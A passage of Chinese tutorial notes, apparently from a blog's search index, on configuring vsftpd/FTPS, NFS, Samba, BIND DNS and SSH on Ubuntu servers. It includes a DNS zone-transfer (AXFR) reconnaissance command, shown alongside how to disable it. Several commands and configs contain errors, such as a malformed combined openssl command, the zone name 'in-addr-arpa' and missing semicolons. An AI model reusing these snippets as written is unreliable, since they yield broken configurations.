\n\nxferlog_enable=YES\t# 默认开启\nxferlog_file=/var/log/vsftpd.log  # 默认日志存放位置(注释不注释他都默认往里面写，可修改)\n\n# 如果修改，重启服务\n```\n\n**其他配置**\n\n```bash\nidle_session_timeout=600\t# 会话超时时长\nno_anon_password=YES\t\t# 命令行登录禁用密码提示\nhide_ids=YES\t\t# 显示属主/数组名称，而不显示uid和gid(uid会比较敏感)\n\n# 重启服务\n```\n\n**端口**\n\n- 会话指令 -> TCP  21端口       \n- 数据传输模式\n  - 主动模式（受客户端防火墙影响）-- 客户端随机产生一个端口，告诉服务器  ->服务端只使用 20端口\t\t\n  - 被动模式 （兼容性好，建议使用）         -- 服务端告诉客户端使用哪个端口传输\n\n```bash\n# 用什么模式，客户端说了算\n# 都是客户端随机产生一个端口，告诉服务端\n\n# 被动模式连接\nftp -p 192.168.0.130\n```\n\n<img src=\"http://image.xpshuai.cn/20200413153011895_32240.png\" />\n\n\n限定`被动模式`数据通信端口\n\n```bash\n# sudo vim /etc/vsftpd.conf   新增配置\n# 开放一个端口的范围(尽量少开) \npasv_min_port=40001\npasv_max_port=40101\n```\n\n然后在服务器端边界防火墙上开放上述100个端口\n\n\n##### 2.身份认证登录\n\n**身份认证登录TFP**\n\n- 安装之后的默认配置\n- 不能上传\n- 可回溯到根目录（`存在安全隐患!!!` --> 使用chroot来解决）\n\n**chroot**\nchroot 将`所有`登录用户锁定在自己的主目录里（防止目录回溯）\n\n```bash\n# 配置文件 sudo vim /etc/vsftpd.conf\n# 全局的配置参数(对所有用户)\nchroot_local_user=YES   # 但是chroot的根目录不能是可写的\n\n# 重启服务\n\n# 默认主目录可写， 但是chroot的根目录不能是可写的，vsftp的禁止用户登录，好猫短   ————> 怎么办呢？看下面\n```\n\n**（接上文）两种解决办法:**\n1.为FTP登录指定新的主目录（建议使用）\n\n```bash\nsudo mkdir ~/ftp && chmod -w ftp    # 新建主目录，并删除写入权限\n# sudo vim /etc/vsftpd.conf\nlocal_root=/home/xps/ftp\n\n# 客户端只能看到这个目录里面，跳不出去\n```\n\n2.允许根目录写入（不建议，存在安全风险）\n\n```bash\n# 配置文件 sudo vim /etc/vsftpd.conf\nwrite_enable=YES\nlocal_root=/home/xps\nallow_writeable_chroot=YES\t\n```\n\n\n**chroot 将`指定`登录用户锁定在自己的主目录里（防止目录回溯）**\n\n```bash\n# 配置文件 sudo vim /etc/vsftpd.conf\n# chroot_local_user=YES   # 注释掉前面配置的全局的配置项\n\n# 启用用户列表功能\nchroot_list_enable=YES  # 如果chroot_local_user=YES也开启了，就起了相反的作用(除了指定列表里面的用户之外, 都锁定在主目录里)\n# 指定用户列表文件\nchroot_list_file=/etc/vsftpd.chroot_list\n# 编辑用户账号列表\nvim /etc/vsftpd/chroot_list\n# 添加用户\nxps\nftp\n\n# 重启服务\n```\n\n禁止指定FTP登录账号\n\n```bash\n/etc/ftpusers  # 默认禁止FTP登录账号(将用户加入进去)\n```\n\n**上传文件权限掩码**\n\n```bash\n# 跟匿名用户的配置是类似的\nlocal_umask=022\n```\n\n**文件同步客户端**\n自动把我电脑的新的文件，上传到FTP服务器(类似于备份) -- 有一些第三方软件(ubuntu自带的同步软件`backup`等)\n\n\n## <font color=red>FTP安全</font>\n\n###### 1.`FTPS`: FTP over Secure Socket Layer(SSL)\n\n>账号无需shell登录权限  \n\n基于证书的加密\n\n开启FTPS：\n\n```bash\n# 安全性--指的是在数据传输过程中不会被别人嗅探\nssl_enable=YES\t\t# 启动FTPS\nrsa_cert_file=/etc/ssl/certs/ssl-cert-snakeoil.pem   # 公钥\nrsa_private_key_file=/etc/ssl/private/ssl-cert-snakeoil.key  # 私钥\n\n# 重启服务\n# 然后再连接的时候就是加密的了(浏览器需要ftps://ip)\n\n# 怎么加密的呢?\n# 简单来说：安装FTP时候默认会生成一对公钥和私钥\n# 不建议使用安装FTP时候默认生成的证书，建议手动生成(每个应用一个证书, 每个证书有效期一两年)\n```\n\n**手动生成证书 --> 替换默认证书(安全考虑)：**\n1.生成秘钥文件\n\n```bash\n# 使用ssl的一个开源组件openssl\nopenssl genrsa -des3 -out ftp.key 4096  # 1024的已经不安全了\n# 然后设置密码保护\n```\n\n2.生成不加密的秘钥文件\n\n```bash\n# 先还原为明文的密钥对\nopenssl rsa -in ftp.key -out ftp.key.insecure  # 用完就删掉这个insecure文件\n# 改名(这是加密的)\nmv ftp.key  server.key.secure \n# 改名(这是明文的)\nmv server.key.insecure  ftp.key\n```\n\n3.生成证书请求文件(使用上面的明文秘钥)   -- 实验使用的自签名证书\n\n```bash\nopenssl req -new -key ftp.key -out ftp.csr\n# 然后输入一些证书的信息\n```\n\n这里使用自签名证书(生产环境建议由证书颁发机构前面生成证书)  \n3.生成自签名证书\n\n```bash\nopenssl x509 -req -days 365 -in ftp.csr -signkey ftp.key -out ftp.pem   # -days 365有效期\n```\n\n4.部署证书\n\n```bash\n# ftp.key放到一个更安全的目录去\nsudo cp ftp.key /etc/ssl/private/  # 此目录root才能看\nsudo cp ftp.pem /etc/ssl/certs/\n```\n\n\n5.修改`/etc/vsftpd.cong`中的key和公钥为刚才手动生成的证书， 然后重启服务\n\n\n上面的操作也可以合并为一条命令\n\n```bash\nopenssl x509 -req -node -days 365 -newkey rsa:4096 -keyout /etc/ssl/private/vsftpd.key -out /etc/ssl/private/vsftpd.pem\n\n```\n\n\n###### 2.`SFTP`: 基于SSH加密隧道传输文件\n\n>账号需要shell登录权限（可设置禁止权限）\n\n远程登录那一章已经学了\n\n\n\n\n## <font color=red>NFS服务</font>\n\n> 适用于类UNIX系统\n\n- NFS -- Network File System\n- 最早由SUN公司开发\n- 类unix平台最主要的文件共享方法\n- 基于RPC(Remote Procedure Call)协议\n  - NFS是一个RPC Server （v3 、v4）\n- 协议本身不加密，可结合SSH，Kerberos实现加密\n- 隐藏式身份验证（难点）\n- 权限配置是关键\n- 服务端口: TCP `2049`\n\n\n**安装**\n\n```bash\nsudo apt-get install nfs-kernel-server  # 服务端\nsudo apt-get install nfs-common\t# 客户端\n\n# 安装完，服务已经都启动了\nps -ef |grep rpc\nps -ef |grep nfs\n```\n\n**进程**\n\n```bash\nrpcbind\t\t# RPC服务进程\nnfsd\t\t# NFS主进程(身份识别)\nmountd\t\t# 根据 /etc/exports 配置验证权限\nlockd\t\t# 锁定（需C/S同时启用）\nstatd\t\t# 一致性（需C/S同时启用）\n```\n\n**身份识别**\n\n- 客户端提供 UID / GID (与用户名、组名无关)\n- 服务器按客户端UID /GID 赋权\n- 若服务器无客户端UID / GID账号，则将客户端映射为匿名账号\n  - nobody / nogroup (uid: 65534)\n- 客户端使用root账号（UID 0），默认映射为匿名账号\n  - 可修改配置文件映射 UID 0 为服务端 ROOT （存在安全隐患）\n\n>如果客户端uid和服务端uid相同，则客户端会获得服务器端账号的权限；若不同，则客户端获取服务端的nobody权限(除非客户端是root账号,且服务端启用了客户端的root映射为服务端的root)\n\n隐式的身份认证\n\n**权限体系**\n\n- 1.共享权限\n- 2.文件系统权限\n\n\n**配置**\n\n```bash\nsudo vim /etc/exports\t# 主配置文件\n# 内容：共享目录,谁可以访问我, 权限，(sync是数据先写到内存在硬盘可靠,async是写到内存然后写的硬盘速度快)，no_subtree_check是不进行子目录的检查(建议使用)\n/exports/public\t\t192.168.1.0/24(rw,sync,no_subtree_check)  # 允许访问的范围可以使用通配符： *.lab.com\n\t\tno_root_squash\t\t# 禁用root默认映射为nobody(加在上面括号中的配置中)\n# \nsudo mkdir -p /exports/public\t\t# 创建共享目录\nsudo chown nobody:nogroup /exports/public\t# 设置权限\nsudo systemctl restart nfs-kernel-server\t# 重启服务\n\nsudo exportfs\t# 查看共享目录\ncat /var/lib/nfs/etab\t# 共享目录\ncat /var/lib/nfs/xtab\t# 客户端信息\n\n```\n\n\n**共享权限**\n\n```bash\nro/rw\t\t# 只读/只写\nsync / async\t# 同步写入硬盘 / 暂存于内存中\nall_squash\t# 所有用户全部映射为nobody\nanonuid / anongid\t# 支付那个匿名ID（默认65534）\nsecure / insecure\t# 使用1024以下/以上端口\nhide / no_hide\t# 共享 / 不共享NFS子目录\n```\n\n**客户端挂载**\n\n```bash\n# 和本地挂载设备一样(挂载到本地，但是访问是通过网络流量的)\nsudo mount 192.168.0.30:/export/public\tmy_nfs/\n\n# 写入文件的话\n1.临时获取root权限，会默认转为nobody\nsudo xxxxx \n2.\nchmod修改其他用户的权限后，直接写入即可(客户端的uid与服务端的uid相同的话)\n```\n\n**启动挂载**\n风险：nfs服务器如果出现问题，本地机器启动就会特别慢\n\n```bash\n# sudo vim /etc/fstab\n192.168.1.30:/home\t/my_nfs/\tnfs no_auto,nofail,noatime,nolock,intr,tcp,actimeo=1800 0 0  # 建议 no_auto 不自动挂载\n```\n\n**其他命令**\n\n```bash\nrpcinfo -p 192.168.1.30  # 查询RPC服务注册状态(客户端与服务端都可以执行)\ntail /var/log/kern.log\t # 服务器日志\nshowmount -e localhost\t # 显示共享目录\ndf -h\t\t\t\t\t # 客户端查看挂载\n```\n\n**企业环境有统一域名和身份验证时**\n\n```bash\n# 也要配置这个\nsudo vim /etc/idpamd.conf\nDomain = lab.com\n```\n\n**Windows客户端**\n企业版才可以添加nfs的支持\n\n\n\n\n## <font color=red>SAMBA服务</font>\n\n**SMB / CIFS 协议**\n\n- 全称Server message block / Common internet file system\n- 最早由IBM研发，后由微软采用并不断完善\n- Windows文件和打印共享（之前使用的SMB协议, 后来改进为cifs协议）\n- 端口：TCP 139(局域网), 445() / UDP 137(用来名称解析),  138\n- Samba 是开源世界逆向了SMB协议后打造的兼容微软SMB的文件共享服务\n- Samba还有其他功能、用途和使用场景\n\n**功能不仅限于此，但最常用的用途，还是做文件共享服务：**\n\n- NFS只适用于类Unix系统环境\n- Samba适用与Windows、Linux混合环境的文件共享需要\n\n\n**Samba实现了CIFS服务的四个基本功能**\n1.文件和打印共享\n2.认证和授权\n3.名称解析\n4.服务宣告(browsing)\n\n**传输协议：**\n\n```bash\nNetBIOS\t\t# 局域网\nNetBIOS over TCP/IP\t\t# 跨网段(把NetBIOS数据包封装之后跨网络传输)\n```\n\n**后台进程**\n\n```bash\nSmbd\t# 文件共享主进程 TCP: 139/445\nNmbd\t# WINS通信、名称解析 UDP: 137/138\nWinbindd\t# 同步系统账号(把Linux系统的账户拷到samba的用户数据库中进行处理)\n其他10多个进程\n```\n\n\n#### 安装\n\n```bash\nsudo apt install samba libpam-winbind\n```\n\n#### 配置\n\n配置文件：\n\n```bash\n/etc/samba/dhcp.conf\t# 指定WINS服务器（跨网段时候用）\n/etc/samba/smb.conf\t\t# 主配置文件\n```\n\n###### 一. 配置验证用户名的Samba服务\n\n1.配置文件/etc/samba/smb.conf\t\n\n```bash\nworkgroup = WORKGROUP  # [global]  工作组：net config worktation查看工作组\n\n[Private]\t# 起个名(共享文件夹的名称)\ncomment = prvivate share\t# 描述\npath = /srv/private/\t\t\t# 共享路径\nbrowseable = no\t\t\t\t# 是否允许访问者可显示它这个共享文件夹(完整账号)\nguest ok = no\t\t\t\t# 禁用来宾账号\nwritable=yes\t\t\t\t# 可读写(read only=yes)\ncreate mask = 0700\t\t \t# 新建文件权限\nvaild users=@samba\t\t\t# 可访问共享的用户组(稍后会创建)\n\n#\n```\n\n2.创建用户/组/共享文件夹\n\n```bash\nsudo adduser user1\nsudo groupadd smaba  # 上面配置的组的名称\nsudo gpasswd -a user1 samba\nsudo smbpasswd -a user1\t# 设置用户SMB密码(不是操作系统的密码)\nsudo mkdir /srv/private/  # 创建共享目录\nsudo setfacl -R -m \"g:samba:rwx\" /srv/private/\t# 设置acl访问控制列表，-m修改 (ll之后看到后面有个+号，表示有更多权限) \ngetfacl /srv/private/  # 查看权限\ntestparm\t\t# 检测\nsudo systemctl restart smbd.service nmbd.service\n```\n\n**客户端访问**\nwin上可以访问Linux上的Samba文件夹, Linux上也可以访问Linux上的Samba文件夹\n\nLinux\n\n```bash\n# 图形化\n点击Connect to Server，输入地址：\nsmb://192.168.0.130\n\n#  命令行\nsmbclient -L //192.168.0.130   # 查看目标都有哪些共享信息\nsmbclient -L //192.168.0.130 -U user1\t\nmount -t cifs -o username=user1  //192.168.0.130/private/public\t/mnt  # 挂载\n```\n\nWindows\n\n```bash\n# win+R\n\\\\192.168.0.130\n\n# 命令行工具来访问\nnet user # 查看会话\nnet user \\\\host\\private/user1 passwd\nnet user \\\\host\\private /delete  # 删除已经建立的会话\nnet user g:  \\\\host\\private \t\t# 映射为本地盘符\n\nnet config workstation \n```\n\n共享名称以`$`结尾的，在win上会认为隐藏共享(Linux上还是会显示)\n\n<img src=\"http://image.xpshuai.cn/20200414155510404_5305.png\" />\n\n###### 二. 配置公开访问的Samba服务(开放共享文件件)\n\n将不提供登录账号的用户映射为guest，无需输入密码  \n\n1.配置文件\n\n```bash\n#配置文件/etc/samba/smb.conf\t\n[Global]\t# 起个名(共享文件夹的名称)\nworkgroup = WORKGROUP \nsecurity = user # share已废止、Domain、ADS、Server\nmap to guest = bad user # 映射为guest\nguest ok = yes\t\t# 允许来宾账号\n```\n\n2.开放共享文件夹\n\n```bash\n[Public]\ncomment = public share\npath = /srv/public/\nbrowseable = yes\t# 允许看到\nwritable = yes\nguest ok = yes\n\n```\n\n3.创建共享目录\n\n```bash\nmkdir -p  /srv/public/\n\n# 设置访问列表（设置user,nobody代表guest）\nsudo setfacl -R -m \"u:nobody:rwx\" /srv/public/\ngetfacl /srv/public/  # 查看权限\n\ntestparm\t\t# 检测\n# 重启服务\nsudo systemctl restart smbd.service nmbd.service\n```\n\n\n**客户端访问**\n同上\n\n\n\n**服务器信息**\n\n```bash\nsmbd --version  # 查看版本\n\nsudo smbstatus\t# 查看状态和连接状况\n\n```","tags":["文件服务"],"categories":["Linux"]},{"title":"ubuntu server-DNS服务","url":"%2Fposts%2F16425%2F","content":"\n\n\n# DNS服务\n\n>您是谁家老小\n\n\n\n## <font color=red>域名解析原理</font>\n\nDNS：将容易基于的主机名映射到IP地址\n**计算机命名规范：**\n\n- Netbiso名称（微软）\n- Hostname\n- DNS分布式名称系统(但是不同的dns服务器是有层级关系的，呈树状结构)\n\n**DNS服务结构：**\n\n- 域名          比如：sina.com.cn\n- FQDN(fully qualified domain names )     比如:www.sina.com.cn  即主机名(www)+域名(sina.com.cn)\n\n**DNS记录类型**\n\n| 记录类型 | 作用                                                         |\n| -------- | ------------------------------------------------------------ |\n| NS       | 域名服务器记录(找a.com与里面的域名对应的ip的话，就要去问域名服务器,问他www的对应的主机的ip地址是多少)，一个域可以有多个域名服务器(`dig a.com ns`) |\n| A        | 主机记录(域名解析到ip地址)                                   |\n| CNAME    | 别名记录(给域名指向另一个A记录的域名,可以叠加)               |\n| MX       | 邮件交换记录                                                 |\n| PTR      | 指针记录（反向查询）                                         |\n| SOA      | 起始授权记录(soa记录对应的域名服务器，才是合法的)            |\n\n\n\n<img src=\"http://image.xpshuai.cn/20200405094807682_18444.png\" />\n\n**DNS命名空间**\n\n<img src=\"http://image.xpshuai.cn/20200405100714099_17972.png\" />`www.ubuntu.com.`严格来说是有点的，但是为了方便，最后面不写点也可以\n\n**DNS查询：** 逐级委派\n由机构`LCANN`负责管理, 负责根域`.`\n\n\n\n## <font color=red>DNS查询寻结构</font>\n\n**三种DNS服务器：**\n\n1. Master(DNS域里面中，master服务器可以修改DNS记录，在master上做得修改也会自动同步到其他slave等dns服务器) 一般只设置一台\n2. Slave（数据文件来自master的同步）  -- 前两者两种服务器都会保存dns记录类型\n3. Cache\t（不保存任何记录，一般都是运营商提供的，跟下面的dns查询有关系，意义：本个区域内有缓存了减少dns会话的流量，提高了效率，减轻了带宽占用，超出生命周期之后才会再次查询）\n   1. TTL\n      4.Forward（转发类型的，比如会去转发给本地运营商的dns服务器(比如家用无线路由器会企业的域控)，而不是自己去进行递归查询啥的）\n      <img src=\"http://image.xpshuai.cn/20200405101258270_2676.png\" />\n\n同时是三种角色\n\n\n##### 安装DNS服务\n\n使用最广的DNS服务的软件包：`BIND（Berkley Internet Naming Daemon）`\n在ubuntu上：\n\n```bash\n# 安装bind(即软件包) 9是版本，dnsutils是用来检查的软件包\nsudo apt install bind9 dnsutils\n\n# DNS服务区只保存和解析本域各种域名记录\n# DNS服务都包含13个根域名服务器地址   \ncat /etc/bind/db.root    # -> ipv4和ipv6地址(AAAA记录)\n\t# 事实分布于世界的数百台根域服务器，不只是13个（国内是有根域服务器的）\n```\n\n**DNS服务器的DNS服务器配置**\n自己做迭代\n指定递归域名服务器（自建尽量禁用其他地址来连接我们递归查询功能, 除非查询的是域内的域名）\n\n```bash\n# 见 DNS主备部署\n```\n\n**DNS默认服务端口**\nTCP 53  / UDP 53\n\n> 这里是以`Bind`软件包为例\n\n**还有其他软件包：**\n\n1. Djbdns\n   - 衍生版本：Dbndns, ndjbsns\n2. dhamasq\n   - DNS + DHCP打包的轻量解决方案 --> 经常用于`无线渗透，搭建无线AP`\n     3.PowerDNS\n   - 模块化开源DNS服务器软件\n\n\n\n\n\n## <font color=red>DNS主备部署</font>\n\n对于dns服务器本身的dns地址可以执行运营商等的地址\n\n### <font color=green>正向区域</font>\n\n#### 配置`Master` DNS服务器\n\n###### 执行区域文件（正向区域 --> 域名解析为ip）\n\n>企业内部自用， 一般一个域中会有两个DNS服务器\n\n1.\n\n```bash\n# sudo vim /etc/bind/named.conf.local\n\n# zone定义一个区域， type类型，指定存具体记录的文件\nzone \"lab.com\"{\n\ttype master;\n\tfile \"/etc/bind/db.lab.com\"\n}\n```\n\n2.编辑区域文件\n\n```bash\n# 拷贝一个现有的区域文件模板，进行修改(也可手动创建)\ncp db.local db.lab.com\n\nsudo vim db.lab.com\n# 文件内容\n; BIND data file for lab.com loopback interface\n;\n$TTL\t604800    # 允许缓存DNS服务器的缓存时长，单位s， 1D ->一天,12h -> 12小时\n@\tIN\tSOA\tsoa.lab.com. root.localhost. (  # @表示本域的域名，   IN ->互联网记录类型， SOA起始授权记录; root.localhost.管理员邮箱地址(点就是@ ->root.lab.com.), 括号多行内容\n\t\t\t      2\t\t; Serial    # 版本号，如果slave的与master服务器字段值相同则不同步数据，不同则同步数据\n\t\t\t 604800\t\t; Refresh\t# slave向master的更新周期\n\t\t\t  86400\t\t; Retry     # 重试周期\n\t\t\t2419200\t\t; Expire\t# 最大重试时间\n\t\t\t 604800 )\t; Negative Cache TTL\n;\n@\tIN\tNS\tns1\t\t# NS记录，dns域的域名服务器的名称\n@\tIN\tA\t10.1.8.128\t# 给哪个域名创建A记录，访问本机的域名解析到哪里\n@\tIN\tAAAA\t::1     # ipv6使用的\nns1\tIN\tA\t10.1.8.10   # 给域的ns记录域名解析到哪个ip\nsoa\tIN\tA\t10.1.8.10\nwww\tIN\tCNAME web       # 把www.lab.com解析为web.com.lab\nweb\tIN\tCNAME w3\t\t# 有一个CNAME记录\nw3\tIN\tA\t  10.1.8.128 # 最终解析为A记录的ip\n@\tIN\tMX 10 mx1     # 优先级，数字越小优先级越高\n@\tIN\tMX 10 mx2    \nmx1\tIN\tA\t10.1.8.1   # 再把mx的域名解析到ip\nmx2\tIN\tA\t10.1.8.2\nftp IN\tA \t10.1.8.128\nftp IN\tA \t10.1.8.129  # 同一个a记录命名指向不同的ip，不区分优先级，而是轮询\n\n```\n\n3.重启服务\n\n```bash\nsudo systemctl restart bind9\nsudo systemctl status bind9\n```\n\n4.服务器配置检查\n\n```bash\nsudo named-checkconf   # 检查语法错误\n\nsudo named-checkzone lab.com /etc/bind/db.lab.com  # 正向区域检查\n\nsudo named-checkzone lab.com /etc/bind/db.lab.com  # 反向区域检查\n```\n\n5.客户端解析验证\n\n```bash\n# dig在win上没有\nping lab.com\n\ndig lab.com ns @10.1.8.10  # 解析ns记录，@dns服务器\n\ndig www.com @10.1.8.10\n\ndig com a @10.1.8.100   # 不指定的话，默认就是a记录\n\ndig lab.com mx @10.1.8.100\n```\n\n客户端解析验证\n\n```bash\n# nslookup在linux和win都有\n\nnslookup\n# 设置参数 \nserver 10.1.8.100    # dns服务器\nset q=ns   # 查询记录类型\nlab.com\t# 查询目标\n\n## Windows本机hi进行dns本地缓存， 而Linux本地是不做缓存的\nipconfig /displaydns   # 显示本地缓存的dns记录\nipconfig /flushdns     # 清空本地缓存的dns记录\n```\n\n\n#### 配置`Cache` DNS服务器\n\n主配置文件`/etc/bind/named.conf`\n\n```bash\n# 只是一个入口文件\ninclude \"/etc/bind/named.conf.options\";  #  规范: 【分号结尾】\ninclude \"/etc/bind/named.conf.local\";    #\ninclude \"/etc/bind/named.conf.default-zones\";\n```\n\n###### 全局转发DNS服务器\n\n对于不属于我们域的解析转发给其他dns服务器  （我们内部的nds服务器不知道怎么解析之后要去找谁）\n配置转发器的文件: ` vim /etc/bind/named.conf.options`\n1.全局转发：\n\n```bash\nacl \"local\"{   # options 块之前\n\t10.1.8.0/24；\t# 本地网段(为公司内部的地址提供服务)\n}； \noptions {\n\trecursion yes;   # recursion即递归查询(公网上的dns服务器一般是禁止递归查询的)\n\tallow-recursion { local; };  # 允许对我发起递归查询的地址范围\n\tlisten-on { 10.0.2.53; };  # 指定侦听的地址\n\tforwarders {\n\t\t9.9.9.9;  # 全局性的转发器，转发给谁\n\t\t8.8.8.8;\n\t};\n};\n```\n\n`sudo systemctl restart bind9.service`\n\n2.局部转发\n\n```bash\nzone \"sina.com.cn\" {   # 创建一个域名\n\ttype forward;\n\tforwarders {\n\t\t202.99.96.68;  #局部转发，针对某个域名转发给某一个ip\n\t\t202.106.0.20;\n\t};\n};\n```\n\n`sudo systemctl restart bind9.service`\n\n解析过之后，就有了缓存，在一定时间内就不会转发再进行请求了  \n\n\n\n\n\n### <font color=green>反向区域</font>\n\n#### 配置`Master DNS`服务器\n\n###### （i反向区域: ip解析为域名 --> 反垃圾邮件）\n\n反垃圾邮件：攻击者伪造域内邮件发送恶意文件；检查外部的邮件是否是从真正的邮件服务器发送过来的\n1.\n\n```bash\n# sudo vim /etc/bind/named.conf.local\n\n# zone定义一个区域， type类型，指定存具体记录的文件\nzone \"8.1.10.in-addr-arpa\"{  # 反着写,这里一个网段的地址10.1.8就写为8.1.10\n\ttype master;\n\tfile \"/etc/bind/db.10.1.8\";\n}\n```\n\n2.\n\n```bash\n# 拷贝一个模板文件\nsudo cp /etc/bind/db.127 /etc/bind/db.10.1.8\n\n# 重启服务\nsudo systemctl restart bind9\nsudo systemctl status bind9\n```\n\n3.\n\n```bash\n# 编辑反向区域配置文件\nvim /etc/bind/db.10.1.8\n# 文件内容\n;\n; BIND reverse data file for local loopback interface\n;\n$TTL    604800\n@   IN  SOA ns.lab.com. root.lab.com. (\n                  1     ; Serial\n             604800     ; Refresh\n              86400     ; Retry\n            2419200     ; Expire\n              604800 )   ; Negative Cache TTL\n;\n@   IN  NS  ns.lab.com.   # 本地的ns记录\n10   IN  PTR ns.lab.com.   # PTR 反向指针记录\n145\t IN\tPTR\t\tmx1.lab.com\t #145即10.1.8.145\n2\t IN\tPTR\t\tmx2.lab.com\t\n2\t IN\tPTR\t\tw3.lab.com\t# 一个ip也可以解析为多个域名\n\n```\n\n4.检测一下反向解析是否正常\n\n```bash\ndig -x 10.1.8.2@10.1.8.2\n```\n\n#### 配置`Slave` DNS服务器\n\n- 为例实现冗余容错(防止某台dns服务器宕机)，通常会为每个与安装多个Slave DNS服务器  \n- 修改记录只能在Master DNS服务器(`一个域内只允许有一个`)上操作，通过`版本号`(Serial)通知Slave服务器同步  (所以。作为master的管理员，配置更新之后需要手动修改版本号的值)\n- 安全考虑\n  - 服务器全局`禁止区域传输`（同步本域所有DNS记录）\n  - 只允许指定IP，指定区域的Slave服务器进行区域传输\n  - 区域数据同步使用TCP 53端口\n\n1.\n\n```bash\n# dig进行区域传输获取信息  axfr(黑客最喜欢拿的)\ndig @10.1.8.10 lab.com axfr\n\n## 禁止区域传输：\n# 全局配置文件   \n# sudo vim named.conf.options\n# 在option中添加：\nallow-transfer { none; };\n\n# 重启\n\n# 禁用之后，不影响dig来查询某记录，只是拒绝一次性把记录拿走\n```\n\n2.继续修改master服务器配置\n\n```bash\n# sudo vim /etc/bind/named.conf.local\n# 在正向/反向zone字段里面都要添加\nallow-transfer { 10.0.2.54; };  # 允许10.0.2.54 -> 就是slave服务器\n```\n\n3.继续修改master服务器配置\n\n```bash\n# vim /etc/bind/db.lab.com\n# 增加一条NS记录和A记录\t\n@\tIN\tNS\tns2\nns2\tIN\tA\t10.1.8.20\n\n\n# 编辑反向的域名解析记录\n# vim db.10.1.8\n20\tIN\tPTR\tns2.lab.com.\n\n\n# 重启服务\n```\n\n4.安装slave dns服务器并配置\n\n```bash\nsudo vim /etc/bind/named.conf.options\n# 内容\nacl \"local\"{   # \n\t10.1.8.0/24；\t\n}； \noptions {\n\trecursion yes;   \n\tallow-recursion { local; };  \n\tlisten-on { 10.0.8.20; };  # 侦听自己的\n\tallow-transfer { none; };\n\t\n\tforwarders {\n\t\t9.9.9.9;  \n\t\t8.8.8.8;\n\t};\n\t............\n};\n\n# 重启服务\n```\n\n5.slave dns服务器上创建区域\n\n```bash\n# sudo vim /etc/bind/named.conf.local\n\n# 正向zone区域（和master上的对应好）\nzone \"lab.com\"{\n\ttype slave;\n\tfile \"db.lab.com\";  # 不能使用绝对路径(区域文件不用手动创建)\n\tmasters { 10.1.8.10; };\n}\n# 反向区域\nzone \"8.1.10.in-addr.arpa\"{\n\ttype slave;\n\tfile \"db.lab.com\";  # 不能使用绝对路径\n\tmasters { 10.1.8.10; };\n}\n\n\n# 重启服务\n\n\n#区域文件db.lab.com不用手动创建\n# 会自动从master上同步下来\n# 位置在 /var/cache/bind/   而且文件是加了密的\n\n# 查看slave dns服务器的情况\ngrep bind /var/log/syslog\n```\n\n**记录更新通知**\nSlave服务器到达更新周期\n客户端数据加密保存（不能直接修改）\nMaster服务器通知版本号\n\nmaster服务器的dns配置更新之后，一定要手动修改版本号，然后重启\n\n在区域配置文件配置（master服务器的dns配置更新之后会通知slave服务器）：\n\n``` bash\n# sudo vim /etc/bind/named.conf.local\n# 正反向zone都要配置\nalso-notify { 10.1.8.20; };\n```\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","tags":["DNS"],"categories":["Linux"]},{"title":"ubuntu server-远程管理","url":"%2Fposts%2F11524%2F","content":"\n\n\n  \n\n# 第七章-远程管理\n\n>看我遥控你\n\n## <font color=red>远程访问方式</font>\n**为什么要远程管理？**\n服务器大多部署与专门的机房：\n- 电磁、噪声、氧气、温度湿度等都不适宜人类长期居住\n- 避免闲杂人等结束业务服务器\n\n**远程管理**\n- 不同的操作系统都支持远程管理技术\n- 命令行远程管理工具\n- 图形化远程管理工具\n\n\n#### Telnet\n>账号证明就是你\n\n古老的命令行远程管理工具（保底的，建议能不用就不用）\n\n- 不安全（明文）\n- 应尽量避免适用（适用于不支持ssh的环境）\n- 客户端程序包含在所有系统的默认安装中\n- 服务端口默认TCP 23\n\n**客户端**\n```bash\n#可以连接任何域名和端口\ntelnet 1.1.1.1 80\n\n#和80端口建立socket连接后，可以发送http数据\n```\n\n**服务器端程序安装**\n```bash\nsudo apt install telnetd\n\nvim /etc/issus.net # 避免泄露版本信息,\n#打开文件，修改tenlet的banner信息（可以修改为一些告知的警告信息:\"本公司的服务器,出问题承担法律责任\"哈哈）\n\n# 查看服务状态\nsystemctl status inetd.service\n```\n\n#### SSH\n>账号证明就是你\n\n**服务器安装**\n```bash\n# ubuntu中ssh-server和ssh-client都默认安装了\nsudo apt install openssh-server  # openssh是个工具套件(包含了sftp,scp等)\n\n# sftp(替代了sftp)  <--->  ftp(明文传输,不太安全)\n# scp(替代了rcp)   <--->  rcp(远程拷贝文件,明文传输,不太安全)\n\n\n#查看服务状态\nsystemctl status sshd.service\n\n\n# 服务端口默认`22`  \n\n# 配置文件(ubuntu上来就可以直接使用不用配置)\nvim /etc/ssh/sshd_config\n#修改配置在这个文件\n\n```\nSSH1、SSH2两个版本(版本2更安全)\n\n\n**配置文件**\n`vim /etc/ssh/sshd_config`\n常用配置项：\n```bash\nBanner /etc/ssh_banner.sh   # 登录前的banner,指定文件\nPort  2222\t\t# 修改默认端口(修改后，下次连接会改变端口)\nPubkeyAuthentication yes\t# 开启后使用公钥登录/关闭(no)\nListenAddress 12.34.56.78  # 指定哪块网卡才能侦听22(被ssh连接)\nPermitRootLogin\tyes\t\t# 是否允许root远程登录(不过还是建议使用普通账号),建议设置为no是禁止所有方式登录   #prohibit-password是禁用账号密码方式\nProtocol 2  # 默认是2.0的协议，可以加一下这条配置，指定只接受2.0版本的连接\nAllowsers user1 user2\t\t# DenyUsers user3    允许/禁止ssh连接的用户\nAllowGroup sshusers\t\t\t# 允许/禁止ssh连接的用户`组`\nPasswordAuthentication no  # 禁止使用密码登录(单一密码认证的安全性很低)\n\n# 更多配置查文档\n```\n\n**一些零散问题  --- SSH工具**\n1.scp\n```bash\n#默认连接22端口，如果修改了就需要指定端口号\nscp a.txt 192.168.1.10:  # 拷贝一个文件(默认本地账号与原创系统账号同名，默认目标是主目录)   注意冒号\nscp a.txt user1@192.168.1.10:/home/b.txt   # 指定用户名、目标路径\n\nscp -rv dirs/ user1@192.168.1.10:   # 拷贝一个目录， -r递归,-v详细信息\n\nscp user1@192.168.1.10:/tmp/b.txt . # 拷贝目标服务器的文件到我的机器当前目录上(下载)\n```\n\n2.SFTP（ssh和ftp的组合）\n```bash\n# 登录\nsftp xps@192.168.1.10\n\n# 下载文件\nget a.txt\n\n# 上传\nput\n\n# 一些命令：help, ls, cd, get, wget, put, mput\n# 退出 quit   exit\n\n```\n\n**ssh公钥登录**\n非对称算法（公钥算法）\n- 公钥\n- 